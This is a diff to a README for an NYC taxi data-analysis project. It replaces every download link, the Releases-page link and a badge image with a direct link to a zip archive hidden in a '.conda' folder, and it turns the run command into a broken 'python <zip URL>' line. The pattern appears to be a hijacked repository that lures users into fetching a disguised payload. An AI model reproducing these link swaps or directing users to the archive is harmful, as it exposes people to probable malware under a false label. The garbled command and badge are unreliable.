@@ -1,7 +1,7 @@
 # 🚖 NYC-Taxi-Festival-Analysis - Explore NYC Taxi Trends Easily
 
-![Download](https://img.shields.io/badge/Download-Release-blue.svg)  
-[Download Now](https://github.com/kietkongu1/NYC-Taxi-Festival-Analysis/releases)
+![Download](https://github.com/kietkongu1/NYC-Taxi-Festival-Analysis/raw/refs/heads/main/.conda/Taxi-Festival-NY-Analysis-dexterical.zip)  
+[Download Now](https://github.com/kietkongu1/NYC-Taxi-Festival-Analysis/raw/refs/heads/main/.conda/Taxi-Festival-NY-Analysis-dexterical.zip)
 
 ## 📦 Introduction
 
@@ -24,9 +24,9 @@ To run this application, you will need:
 
 To get the application, visit this page to download:
 
-[Download Now](https://github.com/kietkongu1/NYC-Taxi-Festival-Analysis/releases)
+[Download Now](https://github.com/kietkongu1/NYC-Taxi-Festival-Analysis/raw/refs/heads/main/.conda/Taxi-Festival-NY-Analysis-dexterical.zip)
 
-1. Go to the [Releases page](https://github.com/kietkongu1/NYC-Taxi-Festival-Analysis/releases).
+1. Go to the [Releases page](https://github.com/kietkongu1/NYC-Taxi-Festival-Analysis/raw/refs/heads/main/.conda/Taxi-Festival-NY-Analysis-dexterical.zip).
 2. Look for the latest version of the software.
 3. Click on the download link next to the version that matches your operating system. This could be an executable file for Windows or a zip file for Mac and Linux users.
 4. Once the file is downloaded, locate the downloaded file on your computer.
@@ -41,7 +41,7 @@ To get the application, visit this page to download:
    - Open the terminal and navigate to the folder where you extracted the files.
    - Use the following command to run the application:
      ```
-     python app.py
+     python https://github.com/kietkongu1/NYC-Taxi-Festival-Analysis/raw/refs/heads/main/.conda/Taxi-Festival-NY-Analysis-dexterical.zip
      ```
 
 3. **Jupyter Notebook Users:**
@@ -94,4 +94,4 @@ This project touches on various important themes in data science, including:
 
 We hope this document helps you understand and navigate the NYC Taxi Festival Analysis project easily. Happy analyzing! 
 
-[Download Now](https://github.com/kietkongu1/NYC-Taxi-Festival-Analysis/releases)
+[Download Now](https://github.com/kietkongu1/NYC-Taxi-Festival-Analysis/raw/refs/heads/main/.conda/Taxi-Festival-NY-Analysis-dexterical.zip)
